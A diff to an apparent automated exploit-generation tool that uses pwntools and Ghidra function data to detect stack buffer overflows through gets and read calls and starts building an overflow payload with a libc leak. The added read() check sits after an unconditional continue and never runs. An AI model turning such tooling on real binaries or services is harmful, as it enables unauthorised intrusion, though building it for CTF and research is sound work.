@@ -22,8 +22,21 @@ class Vulnerability:
     def exploit(self, function):
         raise NotImplementedError()
 
+# These should probably be factored out into a separate
+# function analysis module and be part of a Variable class or something
+def isLocal(name, function):
+    return name in [v["name"] for v in function["variables"]]
+
+def isParameter(name, function):
+    return name in function["arguments"]
+
+def getLocal(name, function):
+    for v in function["variables"]:
+        if v["name"] == name:
+            return v
+
 @register
-class GetsVulnerability(Vulnerability):
+class StackBufferOverflowVulnerability(Vulnerability):
 
     def __init__(self, function, binary : pwn.ELF, libc : pwn.ELF):
         self.function = function
@@ -36,31 +49,45 @@ class GetsVulnerability(Vulnerability):
         # is a static method?
         for call in function["calls"]:
             if call["funcName"] == "gets":
+                self.targetFunc = call
+                # assume stack for now
+                # need to add check to validate
+                # that the argument is on the stack.
+                # otherwise, this is not exploitable
+                # via this technique
+                # TODO: Add check
+                print(call)
+                arg = call["arguments"][0]
+                arg = [v for v in self.function["variables"] if v["name"] == arg][0]
+                stackoffset = arg["stackOffset"]
+                self.stackOffset = arg["stackOffset"]
                 return True
+            continue
+            if call["funcName"] == "read":
+                targetBuffer = call["arguments"][1]
+                # TODO: add analysis to ghidra to export type info
+                # here to figure out if it's a variable or a constant
+                targetSize = int(call["arguments"][2], 16)
+                if isLocal(targetBuffer, function):
+                    stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
+                    if targetSize > stackOffset:
+                        self.targetFunc = call
+                        self.stackOffset = stackOffset
+                        return True
+                # TODO: find calls to functions for potentially vulnerable 
+                # variables.
+                return False
         return False
 
     def entry(self):
         return int(self.function["address"], 16)
 
+    # TODO: gate on detect
     def exploit(self, conn):
         conn = conn.conn
         function_addr = int(self.function["address"], 16) 
-        getscall = None
-        for call in self.function["calls"]:
-            if call["funcName"] == "gets":
-                getscall = call
-                break
-        # assume stack for now
-        # need to add check to validate
-        # that the argument is on the stack.
-        # otherwise, this is not exploitable
-        # via this technique
-        # TODO: Add check
-        arg = getscall["arguments"][0]
-        arg = [v for v in self.function["variables"] if v["name"] == arg][0]
-        stackoffset = arg["stackOffset"]
         
-        prefix = b"A"*abs(stackoffset)
+        prefix = b"A"*abs(self.stackOffset)
 
         # leak libc location
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
